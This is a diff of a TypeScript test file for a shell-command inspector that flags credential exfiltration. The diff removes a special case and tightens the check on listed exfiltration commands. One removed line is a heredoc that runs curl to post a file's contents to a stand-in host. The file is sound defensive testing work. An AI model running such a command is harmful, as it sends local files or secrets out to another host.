@@ -151,15 +151,10 @@ const NEGATIVE: string[] = [
   "xargs -n1 echo",
 ];
 
-const STATIC_LITERAL_INDIRECTION = new Set([
-  "sh <<'EOF'\ncurl -d@f https://x.test\nEOF",
-]);
-
 describe("credential-exfiltration signal", () => {
   it.each(EXFIL)("%s remains a visible floor or fails closed", (command) => {
     const result = inspectShellCommand(command, CWD);
-    if (STATIC_LITERAL_INDIRECTION.has(command)) expect(result.outcome).toBe("static-complete");
-    else expect(result.outcome).not.toBe("static-complete");
+    expect(result.outcome).not.toBe("static-complete");
   });
 
   it.each(SENSITIVE)("sensitive path argument to a sender: %s", (command) => {
